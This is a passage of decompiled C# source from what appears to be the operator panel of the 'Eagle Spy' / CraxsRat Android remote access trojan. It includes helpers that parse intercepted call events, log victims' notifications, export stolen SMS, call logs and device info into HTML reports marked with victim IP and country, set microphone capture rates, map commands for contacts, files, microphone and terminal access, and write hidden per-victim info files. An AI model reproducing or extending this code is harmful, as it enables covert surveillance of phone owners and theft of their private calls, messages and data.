using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WinMM;

namespace Eagle_Spy
{
	// Token: 0x0200009C RID: 156
	[StandardModule]
	internal sealed class reso
	{
		// Token: 0x06000820 RID: 2080 RVA: 0x00004A7C File Offset: 0x00002C7C
		public static Bitmap CheckAdmin(bool isadmin)
		{
			if (isadmin)
			{
				return Resources.shieldon;
			}
			return Resources.shieldoff;
		}

		// Token: 0x06000821 RID: 2081 RVA: 0x000CBB38 File Offset: 0x000C9D38
		public static string CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhqws(string MSG, Client cli)
		{
			MSG = MSG.Replace("@", "");
			string[] array = MSG.Split(new char[] { '|' });
			string text = array[1];
			string text2 = array[2];
			string text3 = "null";
			string text4 = array[0];
			if (!(text4 == "onn"))
			{
				if (!(text4 == "ens"))
				{
					if (!(text4 == "ene"))
					{
						if (!(text4 == "ogs"))
						{
							if (!(text4 == "oge"))
							{
								if (text4 == "mc")
								{
									text3 = "• [ Missed Call ]";
								}
							}
							else
							{
								text3 = "• [ Ended \ud83e\udc81 ]";
							}
						}
						else
						{
							text3 = "• [ Started \ud83e\udc81 ]";
						}
					}
					else
					{
						text3 = "• [ Ended \ud83e\udc83 ]";
					}
				}
				else
				{
					text3 = "• [ Answered \ud83e\udc83 ]";
				}
			}
			else
			{
				text3 = "• [ Received \ud83e\udc83 ]";
			}
			Data.MainForm.LogCalls(new object[]
			{
				Codes.ResizeImage(cli.Wallpaper, new Size(45, 45), false),
				text3
			});
			if (text.ToLower().Contains("null"))
			{
				text = "Not Found";
			}
			return string.Concat(new string[] { text3, "\r\n┃\r\n┗━━➤Number: --> ", text, "\r\n┃\r\n┗━━━➤Date: -> ", text2 });
		}

		// Token: 0x06000822 RID: 2082 RVA: 0x00004A8C File Offset: 0x00002C8C
		public static string ChekLink(string lnk)
		{
			if (!lnk.StartsWith("https://") && !lnk.StartsWith("http://"))
			{
				return "https://" + lnk;
			}
			return lnk;
		}

		// Token: 0x06000823 RID: 2083 RVA: 0x000CBC6C File Offset: 0x000C9E6C
		private static string GetFlag(string ips)
		{
			if (!ips.Contains("-"))
			{
				return "";
			}
			string text = ips.Split(new char[] { '-' })[1].Trim();
			Bitmap bitmap = (Bitmap)GetFlagThisIp.ThisIp(text);
			if (bitmap == null)
			{
				return "";
			}
			ImageConverter imageConverter = new ImageConverter();
			byte[] array = (byte[])imageConverter.ConvertTo(bitmap, typeof(byte[]));
			bitmap.Dispose();
			return "<img src=\"data:Image/ png;base64," + Convert.ToBase64String(array) + "\" alt=\"flag\" />";
		}

		// Token: 0x06000824 RID: 2084 RVA: 0x000CBCF4 File Offset: 0x000C9EF4
		public static void Directory_Exist(Client clas)
		{
			if (clas != null)
			{
				string folderUSER = clas.FolderUSER;
				if (!Directory.Exists(folderUSER))
				{
					Directory.CreateDirectory(folderUSER);
				}
				reso.Sys(new string[] { folderUSER, clas.ClientName, clas.ClientAddressIP, clas.Country });
			}
		}

		// Token: 0x06000825 RID: 2085 RVA: 0x000CBD44 File Offset: 0x000C9F44
		internal static string CheckTypeScreenRead(string v)
		{
			string text;
			if (!(v == "0"))
			{
				if (!(v == "1"))
				{
					if (!(v == "2"))
					{
						if (!(v == "3"))
						{
							if (!(v == "4"))
							{
								if (!(v == "5"))
								{
									text = "";
								}
								else
								{
									text = "CheckBox:";
								}
							}
							else
							{
								text = "Pic:";
							}
						}
						else
						{
							text = "Pic:";
						}
					}
					else
					{
						text = "Text:";
					}
				}
				else
				{
					text = "Button:";
				}
			}
			else
			{
				text = "textbox:";
			}
			return text;
		}

		// Token: 0x06000826 RID: 2086 RVA: 0x000CBDD8 File Offset: 0x000C9FD8
		public static string GetVersionClient(string[] k)
		{
			if (k.Length < 9)
			{
				return "";
			}
			string text = k[8].Trim();
			if (Operators.CompareString(text, "[CR]", false) != 0)
			{
				return k[8].Trim();
			}
			return "k";
		}

		// Token: 0x06000827 RID: 2087 RVA: 0x000CBE18 File Offset: 0x000CA018
		public static void Sys(string[] data)
		{
			try
			{
				string text = data[0] + "\\user.info";
				if (File.Exists(text))
				{
					File.SetAttributes(text, FileAttributes.Normal);
				}
				File.WriteAllText(text, string.Concat(new string[]
				{
					data[1],
					"\r\n",
					data[2],
					"\r\n",
					data[3]
				}));
				File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000828 RID: 2088 RVA: 0x00004AB5 File Offset: 0x00002CB5
		internal static string[] formatrecords(string thedata)
		{
			return thedata.Split(new char[] { '*' });
		}

		// Token: 0x06000829 RID: 2089 RVA: 0x000CBE98 File Offset: 0x000CA098
		internal static object formatPasses(string tHEDATA)
		{
			string[] array = tHEDATA.Split(new char[] { '<' });
			return new object[]
			{
				array[0],
				array[1],
				array[2]
			};
		}

		// Token: 0x0600082A RID: 2090 RVA: 0x000CBED0 File Offset: 0x000CA0D0
		public static void SAVEit(Array ar)
		{
			string text = string.Format("{0}, {1}, {2}", SpySettings.DefaultColor_Foreground.R, SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B);
			string text2 = string.Format("{0}, {1}, {2}", SpySettings.DefaultColor_Background.R, SpySettings.DefaultColor_Background.G, SpySettings.DefaultColor_Background.B);
			string text3 = string.Format("{0}, {1}, {2}", SpySettings.DefaultColor_ColorTitles.R, SpySettings.DefaultColor_ColorTitles.G, SpySettings.DefaultColor_ColorTitles.B);
			string text4 = (string)ar.GetValue(6);
			checked
			{
				if (!(text4 == "log"))
				{
					if (!(text4 == "sms"))
					{
						if (!(text4 == "info"))
						{
							return;
						}
						goto IL_098A;
					}
				}
				else
				{
					string text5 = string.Concat(new string[]
					{
						"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(", text, ");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(", text2, ");\r\n  background-color: rgb(", text, ");\r\n}\r\n::selection {\r\n  color: rgb(", text2, ");\r\n  background-color: rgb(", text,
						");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(", text2, ");font-family:courier;\" >\r\n<table style=\"width:50%\">"
					});
					string text6 = (string)ar.GetValue(3);
					string text7 = (string)ar.GetValue(4);
					string text8 = (string)ar.GetValue(5);
					string text9 = string.Concat(new string[]
					{
						"<h1 style=\"color: rgb(",
						text,
						");\">",
						text6,
						"</h1>\r\n<h2 style=\"color: rgb(",
						text,
						");\">",
						(Operators.CompareString(reso.GetFlag(text7), "", false) == 0) ? "" : (reso.GetFlag(text7) + Strings.Space(1)),
						text7.Replace("-", "/ip:"),
						"</h2>\r\n<p style=\"color: rgb(",
						text,
						");\">",
						text8,
						"</p>"
					});
					string text10;
					if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", false))
					{
						text10 = Conversions.ToString(ar.GetValue(2));
					}
					else
					{
						string text11 = (string)ar.GetValue(1) + "\\";
						string text12 = (string)ar.GetValue(2) + "\\";
						string text13 = (string)ar.GetValue(7);
						if (!Directory.Exists(text11))
						{
							return;
						}
						if (!Directory.Exists(text11 + text12))
						{
							Directory.CreateDirectory(text11 + text12);
						}
						text10 = text11 + text12 + text13;
						if (!File.Exists(text10))
						{
							File.Create(text10).Close();
						}
						if (!File.Exists(text10))
						{
							return;
						}
					}
					using (StreamWriter streamWriter = new StreamWriter(text10, true, Codes.Encoding()))
					{
						streamWriter.Write(text5 + "\r\n");
						streamWriter.Write(text9 + "\r\n");
						streamWriter.Write(string.Concat(new string[] { "<tr style=\"color: rgb(", text2, "); background: rgb(", text, ");\">\r\n" }));
						DataGridView dataGridView = (DataGridView)ar.GetValue(0);
						int num = dataGridView.ColumnCount - 1;
						for (int i = 0; i <= num; i++)
						{
							if (dataGridView.Columns[i].GetType().ToString().ToLower()
								.Contains("DataGridViewTextBoxColumn".ToLower()))
							{
								streamWriter.Write("<th>" + dataGridView.Columns[i].HeaderText + "</th>\r\n");
							}
						}
						int num2 = dataGridView.Rows.Count - 1;
						for (int j = 0; j <= num2; j++)
						{
							streamWriter.Write("</tr>\r\n");
							streamWriter.Write(string.Concat(new string[] { "<tr style=\"color: rgb(", text, "); background: rgb(", text2, ");\">\r\n" }));
							int num3 = dataGridView.ColumnCount - 1;
							for (int k = 0; k <= num3; k++)
							{
								if (dataGridView.Columns[k].GetType().ToString().ToLower()
									.Contains("DataGridViewTextBoxColumn".ToLower()))
								{
									streamWriter.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", dataGridView.Rows[j].Cells[k].Value), "</td>"), "\r\n"));
								}
							}
							streamWriter.Write("</tr>\r\n");
						}
						streamWriter.Write("</table>\r\n");
						streamWriter.Write("</body>\r\n");
						streamWriter.Write("</html>\r\n");
						streamWriter.Close();
						return;
					}
				}
				DataGridView dataGridView2 = (DataGridView)ar.GetValue(0);
				string text14 = string.Concat(new string[]
				{
					"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(", text, ");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(", text2, ");\r\n  background-color: rgb(", text, ");\r\n}\r\n::selection {\r\n  color: rgb(", text2, ");\r\n  background-color: rgb(", text,
					");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(", text2, ");font-family:courier;\" >\r\n<table style=\"width:50%\">"
				});
				string text15 = (string)ar.GetValue(3);
				string text16 = (string)ar.GetValue(4);
				string text17 = string.Empty;
				if (dataGridView2.Rows.Count > 0)
				{
					text17 = Conversions.ToString(dataGridView2.Rows[0].Cells[4].Value);
				}
				string text18 = (string)ar.GetValue(5) + Strings.Space(1) + text17;
				string text19 = string.Concat(new string[]
				{
					"<h1 style=\"color: rgb(",
					text,
					");\">",
					text15,
					"</h1>\r\n<h2 style=\"color: rgb(",
					text,
					");\">",
					(Operators.CompareString(reso.GetFlag(text16), "", false) == 0) ? "" : (reso.GetFlag(text16) + Strings.Space(1)),
					text16.Replace("-", "/ip:"),
					"</h2>\r\n<p style=\"color: rgb(",
					text,
					");\">",
					text18,
					"</p>"
				});
				string text20;
				if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", false))
				{
					text20 = Conversions.ToString(ar.GetValue(2));
				}
				else
				{
					string text21 = (string)ar.GetValue(1) + "\\";
					string text22 = (string)ar.GetValue(2) + "\\";
					string text23 = (string)ar.GetValue(7);
					if (!Directory.Exists(text21))
					{
						return;
					}
					if (!Directory.Exists(text21 + text22))
					{
						Directory.CreateDirectory(text21 + text22);
					}
					text20 = text21 + text22 + text23;
					if (!File.Exists(text20))
					{
						File.Create(text20).Close();
					}
					if (!File.Exists(text20))
					{
						return;
					}
				}
				using (StreamWriter streamWriter2 = new StreamWriter(text20, true, Codes.Encoding()))
				{
					streamWriter2.Write(text14 + "\r\n");
					streamWriter2.Write(text19 + "\r\n");
					streamWriter2.Write(string.Concat(new string[] { "<style>\r\ndiv {border: 2px solid gray;padding: 10px;color: rgb(", text, ");\r\n border-color: rgb(", text, ")\r\n}\r\n<p style=\"color: rgb(", text, ");\">\r\n</style>\r\n" }));
					string headerText = dataGridView2.Columns[0].HeaderText;
					string headerText2 = dataGridView2.Columns[1].HeaderText;
					string headerText3 = dataGridView2.Columns[2].HeaderText;
					int num4 = dataGridView2.Rows.Count - 1;
					for (int l = 0; l <= num4; l++)
					{
						streamWriter2.Write("<div>\r\n");
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText + ":", dataGridView2.Rows[l].Cells[0].Value), "</p>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText2 + ":", dataGridView2.Rows[l].Cells[1].Value), "</p>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>" + headerText3 + ":", dataGridView2.Rows[l].Cells[2].Value), "</p>"), "\r\n"));
						streamWriter2.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<p>", dataGridView2.Rows[l].Tag), "</p>"), "\r\n"));
						streamWriter2.Write("</div>\r\n");
					}
					streamWriter2.Write("</body>\r\n");
					streamWriter2.Write("</html>\r\n");
					streamWriter2.Close();
					return;
				}
			}
			IL_098A:
			string text24 = string.Concat(new string[]
			{
				"<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<style>\r\ntable, th, td {\r\n  border: 1px solid rgb(", text, ");\r\n  border-collapse: collapse;\r\n  text-align: left;\r\n}\r\n  tr.noBorder td {\r\n  border: 0;\r\n}\r\n<style>\r\n::-moz-selection {\r\n  color: rgb(", text2, ");\r\n  background-color: rgb(", text, ");\r\n}\r\n::selection {\r\n  color: rgb(", text2, ");\r\n  background-color: rgb(", text,
				");\r\n}\r\n</style>\r\n</head>\r\n \r\n<body style=\"background: rgb(", text2, ");font-family:courier;\" >\r\n<table style=\"width:50%\">"
			});
			string text25 = (string)ar.GetValue(3);
			string text26 = (string)ar.GetValue(4);
			string text27 = (string)ar.GetValue(5);
			string text28 = string.Concat(new string[]
			{
				"<h1 style=\"color: rgb(",
				text,
				");\">",
				text25,
				"</h1>\r\n<h2 style=\"color: rgb(",
				text,
				");\">",
				(Operators.CompareString(reso.GetFlag(text26), "", false) == 0) ? "" : (reso.GetFlag(text26) + Strings.Space(1)),
				text26.Replace("-", "/ip:"),
				"</h2>\r\n<p style=\"color: rgb(",
				text,
				");\">",
				text27,
				"</p>"
			});
			string text29;
			if (Operators.ConditionalCompareObjectEqual(ar.GetValue(1), "null", false))
			{
				text29 = Conversions.ToString(ar.GetValue(2));
			}
			else
			{
				string text30 = (string)ar.GetValue(1) + "\\";
				string text31 = (string)ar.GetValue(2) + "\\";
				string text32 = (string)ar.GetValue(7);
				if (!Directory.Exists(text30))
				{
					return;
				}
				if (!Directory.Exists(text30 + text31))
				{
					Directory.CreateDirectory(text30 + text31);
				}
				text29 = text30 + text31 + text32;
				if (!File.Exists(text29))
				{
					File.Create(text29).Close();
				}
				if (!File.Exists(text29))
				{
					return;
				}
			}
			using (StreamWriter streamWriter3 = new StreamWriter(text29, true, Codes.Encoding()))
			{
				streamWriter3.Write(text24 + "\r\n");
				streamWriter3.Write(text28 + "\r\n");
				streamWriter3.Write(string.Concat(new string[] { "<tr style=\"color: rgb(", text2, "); background: rgb(", text, ");\">\r\n" }));
				DataSet dataSet = (DataSet)ar.GetValue(0);
				DataTable dataTable = dataSet.Tables[0];
				streamWriter3.Write("<th>" + dataTable.Columns[0].ColumnName + "</th>\r\n");
				streamWriter3.Write("<th>" + dataTable.Columns[1].ColumnName + "</th>\r\n");
				foreach (object obj in dataTable.Rows)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					streamWriter3.Write("</tr>\r\n");
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, null, "Item", new object[] { 1 }, null, null, null), "sub", false))
					{
						streamWriter3.Write(string.Concat(new string[] { "<tr Class=\"noBorder\"; style=\"color: rgb(", text3, "); background: rgb(", text2, ");\">\r\n" }));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[] { 0 }, null, null, null)), "</td>"), "\r\n"));
						streamWriter3.Write("<td>" + string.Empty + "</td>\r\n");
						streamWriter3.Write("</tr>\r\n");
					}
					else
					{
						streamWriter3.Write(string.Concat(new string[] { "<tr style=\"color: rgb(", text, "); background: rgb(", text2, ");\">\r\n" }));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[] { 0 }, null, null, null)), "</td>"), "\r\n"));
						streamWriter3.Write(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("<td>", NewLateBinding.LateGet(objectValue, null, "Item", new object[] { 1 }, null, null, null)), "</td>"), "\r\n"));
						streamWriter3.Write("</tr>\r\n");
					}
				}
				streamWriter3.Write("</table>\r\n");
				streamWriter3.Write("</body>\r\n");
				streamWriter3.Write("</html>\r\n");
				streamWriter3.Close();
			}
		}

		// Token: 0x0600082B RID: 2091 RVA: 0x000CCDBC File Offset: 0x000CAFBC
		internal static void FormatNotifi(string tHEDATA, Client cli)
		{
			checked
			{
				try
				{
					string[] array = tHEDATA.Split(new char[] { '|' });
					string text = array[0];
					string text2 = array[1];
					string text3 = array[2] + array[3];
					int num = cli.Notifications.Count<string>() - 1;
					for (int i = 0; i <= num; i++)
					{
						if (cli.Notifications[i] == null)
						{
							cli.Notifications[i] = string.Concat(new string[] { "\r\n\r\n", text, "\r\n\r\n", text2, "\r\n\r\n", text3 });
							break;
						}
					}
					cli.isnewnotifi = true;
					Data.MainForm.LogNotifi(new object[]
					{
						Codes.ResizeImage(cli.Wallpaper, new Size(45, 45), false),
						text3
					});
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600082C RID: 2092 RVA: 0x00004AC8 File Offset: 0x00002CC8
		public static void UPDATEKEY(string key, Collection Col, object[] obj)
		{
			Col.Remove(key);
			Col.Add(obj, key, null, null);
		}

		// Token: 0x0600082D RID: 2093 RVA: 0x000CCE9C File Offset: 0x000CB09C
		public static object GETKEY(string key, Collection Col)
		{
			object obj;
			try
			{
				obj = Col[key];
			}
			catch (Exception)
			{
				obj = null;
			}
			return obj;
		}

		// Token: 0x0600082E RID: 2094 RVA: 0x000CCECC File Offset: 0x000CB0CC
		public static string BytesConverter(long bytes)
		{
			long num = 1024L;
			long num2 = 1048576L;
			long num3 = 1073741824L;
			long num4 = 1099511627776L;
			string text = "0 Bytes";
			if (bytes < 1024L)
			{
				text = Conversions.ToString(bytes) + " Bytes";
			}
			else if (bytes > num4)
			{
				text = ((double)bytes / (double)num / (double)num / (double)num / (double)num).ToString("0.00") + " TB";
			}
			else if (bytes > num3)
			{
				text = ((double)bytes / (double)num / (double)num / (double)num).ToString("0.00") + " GB";
			}
			else if (bytes > num2)
			{
				text = ((double)bytes / (double)num / (double)num).ToString("0.00") + " MB";
			}
			else if (bytes >= num)
			{
				text = ((double)bytes / (double)num).ToString("0.00") + " KB";
			}
			return text.ToString();
		}

		// Token: 0x0600082F RID: 2095 RVA: 0x000CCFCC File Offset: 0x000CB1CC
		public static string Between(string v0, string v1)
		{
			string text;
			try
			{
				text = Regex.Match(reso.maps.ToString(), string.Concat(new string[]
				{
					"(?<=",
					Regex.Escape(v0),
					").+?(?=",
					Regex.Escape(v1),
					")"
				}), RegexOptions.IgnoreCase).Value;
			}
			catch (Exception)
			{
				text = "-1";
			}
			return text;
		}

		// Token: 0x06000830 RID: 2096 RVA: 0x000CD040 File Offset: 0x000CB240
		public static WaveFormat FormatWave(int v)
		{
			if (v <= 16000)
			{
				if (v == 8000)
				{
					return WaveFormat.Pcm8Khz16BitMono;
				}
				if (v == 11025)
				{
					return WaveFormat.Pcm11Khz16BitMono;
				}
				if (v == 16000)
				{
					return WaveFormat.Pcm16Khz16BitMono;
				}
			}
			else
			{
				if (v == 22050)
				{
					return WaveFormat.Pcm22Khz16BitMono;
				}
				if (v == 32000)
				{
					return WaveFormat.Pcm32Khz16BitMono;
				}
				if (v == 44100)
				{
					return WaveFormat.Pcm44Khz16BitMono;
				}
			}
			return WaveFormat.Pcm8Khz16BitMono;
		}

		// Token: 0x06000831 RID: 2097 RVA: 0x000CD0C0 File Offset: 0x000CB2C0
		public static string HzString(int v)
		{
			if (v <= 16000)
			{
				if (v == 8000)
				{
					return "8000 (Hz)";
				}
				if (v == 11025)
				{
					return "11025 (Hz)";
				}
				if (v == 16000)
				{
					return "16000 (Hz)";
				}
			}
			else
			{
				if (v == 22050)
				{
					return "22050 (Hz)";
				}
				if (v == 32000)
				{
					return "32000 (Hz)";
				}
				if (v == 44100)
				{
					return "44100 (Hz)";
				}
			}
			return "null";
		}

		// Token: 0x06000832 RID: 2098 RVA: 0x000CD140 File Offset: 0x000CB340
		public static int HzInt(string v)
		{
			int num;
			if (!(v == "8000 (Hz)"))
			{
				if (!(v == "11025 (Hz)"))
				{
					if (!(v == "16000 (Hz)"))
					{
						if (!(v == "22050 (Hz)"))
						{
							if (!(v == "32000 (Hz)"))
							{
								if (!(v == "44100 (Hz)"))
								{
									num = 8000;
								}
								else
								{
									num = 44100;
								}
							}
							else
							{
								num = 32000;
							}
						}
						else
						{
							num = 22050;
						}
					}
					else
					{
						num = 16000;
					}
				}
				else
				{
					num = 11025;
				}
			}
			else
			{
				num = 8000;
			}
			return num;
		}

		// Token: 0x06000833 RID: 2099 RVA: 0x00004ADB File Offset: 0x00002CDB
		public static string Maps_style()
		{
			return SpySettings.STYLE_MAPS;
		}

		// Token: 0x06000834 RID: 2100 RVA: 0x000CD1D4 File Offset: 0x000CB3D4
		public static Bitmap GetBattery(string Clientbat)
		{
			int num = Conversions.ToInteger(Clientbat.Replace("f", ""));
			if (num < 0)
			{
				return Resources.chrg;
			}
			if (num <= 25)
			{
				return Resources.low;
			}
			if (num <= 50)
			{
				return Resources.min;
			}
			if (num <= 80)
			{
				return Resources.Abov_mid;
			}
			return Resources.full;
		}

		// Token: 0x06000835 RID: 2101 RVA: 0x000CD228 File Offset: 0x000CB428
		public static string Generals(string num)
		{
			if (num != null)
			{
				int length = num.Length;
				if (length == 5)
				{
					switch (num[4])
					{
					case '1':
						if (num == "gen-1")
						{
							return "apps";
						}
						break;
					case '2':
						if (num == "gen-2")
						{
							return "calls";
						}
						break;
					case '3':
						if (num == "gen-3")
						{
							return "contacts";
						}
						break;
					case '4':
						if (num == "gen-4")
						{
							return "files";
						}
						break;
					case '5':
						if (num == "gen-5")
						{
							return "info";
						}
						break;
					case '6':
						if (num == "gen-6")
						{
							return "microphone";
						}
						break;
					case '7':
						if (num == "gen-7")
						{
							return "sms";
						}
						break;
					case '8':
						if (num == "gen-8")
						{
							return "terminal";
						}
						break;
					}
				}
			}
			ProjectData.EndApp();
			return null;
		}

		// Token: 0x06000836 RID: 2102 RVA: 0x000CD334 File Offset: 0x000CB534
		public static void NewIcon(string icon, string path)
		{
			string text = "DefaultIcon";
			try
			{
				RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(path + "\\" + text, true);
				if (registryKey == null)
				{
					Registry.ClassesRoot.CreateSubKey(path + "\\" + text).SetValue("", icon);
					RefreshExplorer.EnvRefresh();
				}
				else if (!File.Exists(Conversions.ToString(registryKey.GetValue(""))))
				{
					registryKey.SetValue("", icon);
					RefreshExplorer.EnvRefresh();
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
		}

		// Token: 0x06000837 RID: 2103 RVA: 0x000CD3C8 File Offset: 0x000CB5C8
		public static Bitmap GetScreen(string v)
		{
			string text = v.Trim();
			Bitmap bitmap;
			if (!(text == "0"))
			{
				if (!(text == "1"))
				{
					if (!(text == "2"))
					{
						if (!(text == "3"))
						{
							bitmap = Resources.OFF;
						}
						else
						{
							bitmap = Resources.OFF;
						}
					}
					else
					{
						bitmap = Resources._on;
					}
				}
				else
				{
					bitmap = Resources.OFF_LOCK;
				}
			}
			else
			{
				bitmap = Resources.ON_LOCK;
			}
			return bitmap;
		}

		// Token: 0x06000838 RID: 2104 RVA: 0x000CD43C File Offset: 0x000CB63C
		private static Bitmap FormatImg(string s, Client Client)
		{
			MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(s));
			Bitmap bitmap = new Bitmap(Image.FromStream(memoryStream));
			memoryStream.Dispose();
			return new Bitmap(reso.CropToCircle(bitmap));
		}

		// Token: 0x06000839 RID: 2105 RVA: 0x000CD474 File Offset: 0x000CB674
		public static Image addflag(Image bmPhoto, Image imgPhoto)
		{
			checked
			{
				try
				{
					Bitmap bitmap = new Bitmap(bmPhoto);
					bitmap.SetResolution(imgPhoto.HorizontalResolution, imgPhoto.VerticalResolution);
					Graphics graphics = Graphics.FromImage(bitmap);
					ImageAttributes imageAttributes = new ImageAttributes();
					ColorMap[] array = new ColorMap[]
					{
						new ColorMap
						{
							OldColor = Color.FromArgb(255, 0, 255, 0),
							NewColor = Color.FromArgb(0, 0, 0, 0)
						}
					};
					imageAttributes.SetRemapTable(array, ColorAdjustType.Bitmap);
					int num = bmPhoto.Width - imgPhoto.Width - 10;
					graphics.DrawImage(imgPhoto, new Rectangle(num + 18, 25, imgPhoto.Width, imgPhoto.Height), 0, 0, imgPhoto.Width, imgPhoto.Height, GraphicsUnit.Pixel, imageAttributes);
					imgPhoto = bitmap;
					graphics.Dispose();
					return imgPhoto;
				}
				catch (Exception)
				{
				}
				return bmPhoto;
			}
		}

		// Token: 0x0600083A RID: 2106 RVA: 0x000CD550 File Offset: 0x000CB750
		public static Image CropToCircle(Image srcImage)
		{
			Bitmap bitmap = new Bitmap(srcImage.Width, srcImage.Height);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				GraphicsPath graphicsPath = new GraphicsPath();
				graphics.SmoothingMode = SmoothingMode.AntiAlias;
				graphicsPath.AddEllipse(0, 0, bitmap.Width, bitmap.Height);
				global::System.Drawing.Region region = (graphics.Clip = new global::System.Drawing.Region(graphicsPath));
				global::System.Drawing.Region region2 = region;
				graphics.DrawImage(srcImage, Point.Empty);
				region2.Dispose();
				graphicsPath.Dispose();
			}
			srcImage.Dispose();
			srcImage.Dispose();
			return bitmap;
		}

		// Token: 0x0600083B RID: 2107 RVA: 0x000CD5F0 File Offset: 0x000CB7F0
		public static Bitmap Wallpaper(string v, int xx, int yy, Client Client)
		{
			string text = Resources.wallpaper.ToString().Trim();
			if ((Operators.CompareString(v, "-1", false) != 0) | (Operators.CompareString(v, "", false) == 0))
			{
				byte[] array = Convert.FromBase64String(v);
				MemoryStream memoryStream = new MemoryStream(array);
				Bitmap bitmap = new Bitmap(Image.FromStream(memoryStream));
				int width = bitmap.Size.Width;
				int height = bitmap.Size.Height;
				if (width == xx && height == yy)
				{
					text = v;
				}
				bitmap.Dispose();
				memoryStream.Dispose();
			}
			return reso.FormatImg(text, Client);
		}

		// Token: 0x0600083C RID: 2108 RVA: 0x000CD68C File Offset: 0x000CB88C
		public static Image GetEllImage(int sel, object[] parm)
		{
			checked
			{
				if (sel != 0)
				{
					if (sel != 1)
					{
						return null;
					}
					Color color = Color.FromArgb(170, (int)SpySettings.DefaultColor_Background.R, (int)SpySettings.DefaultColor_Background.G, (int)SpySettings.DefaultColor_Background.B);
					Pen pen = new Pen(color, 2f);
					using (Bitmap bitmap = new Bitmap(48, 48))
					{
						using (Graphics graphics = Graphics.FromImage(bitmap))
						{
							graphics.SmoothingMode = SmoothingMode.AntiAlias;
							using (TextureBrush textureBrush = new TextureBrush(bitmap))
							{
								textureBrush.TranslateTransform(0f, 0f);
								using (new GraphicsPath())
								{
									using (SolidBrush solidBrush = new SolidBrush(reso.getClr()))
									{
										graphics.FillEllipse(solidBrush, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
									}
									graphics.DrawEllipse(pen, 4, 4, bitmap.Width - 12, bitmap.Height - 12);
								}
							}
							string text = parm[0].ToString();
							if (Conversions.ToBoolean(Operators.AndObject(Operators.CompareString(text, "null", false) == 0, Operators.NotObject(Operators.CompareObjectEqual(parm[2], null, false)))))
							{
								text = parm[1].ToString();
							}
							string text2 = Strings.Space(1);
							if (text.Trim().Length > 0)
							{
								text2 = Conversions.ToString(text[0]);
							}
							Rectangle rectangle = new Rectangle(6, 6, bitmap.Width - 15, bitmap.Height - 15);
							StringFormat stringFormat = new StringFormat();
							stringFormat.LineAlignment = StringAlignment.Center;
							stringFormat.Alignment = StringAlignment.Center;
							graphics.DrawString(text2, reso.FontDrawString, new SolidBrush(color), rectangle, stringFormat);
						}
						return new Bitmap(bitmap);
					}
				}
				Color color2 = Color.FromArgb(170, (int)SpySettings.DefaultColor_Background.R, (int)SpySettings.DefaultColor_Background.G, (int)SpySettings.DefaultColor_Background.B);
				Pen pen2 = new Pen(color2, 2f);
				Image image2;
				using (Bitmap bitmap2 = new Bitmap(48, 48))
				{
					using (Graphics graphics2 = Graphics.FromImage(bitmap2))
					{
						graphics2.SmoothingMode = SmoothingMode.AntiAlias;
						using (TextureBrush textureBrush2 = new TextureBrush(bitmap2))
						{
							textureBrush2.TranslateTransform(0f, 0f);
							using (new GraphicsPath())
							{
								using (SolidBrush solidBrush2 = new SolidBrush(reso.getClr()))
								{
									graphics2.FillEllipse(solidBrush2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
								}
								graphics2.DrawEllipse(pen2, 4, 4, bitmap2.Width - 12, bitmap2.Height - 12);
							}
						}
						Image image = new Bitmap(parm[0].ToString());
						graphics2.DrawImage(reso.RECOLOR(image, Color.FromArgb(190, 190, 190), color2), Conversions.ToInteger(parm[1]), Conversions.ToInteger(parm[2]), Conversions.ToInteger(parm[3]), Conversions.ToInteger(parm[4]));
					}
					image2 = new Bitmap(bitmap2);
				}
				return image2;
			}
		}

		// Token: 0x0600083D RID: 2109 RVA: 0x00004AE2 File Offset: 0x00002CE2
		private static Color getClr()
		{
			return SpySettings.DefaultColor_Foreground;
		}

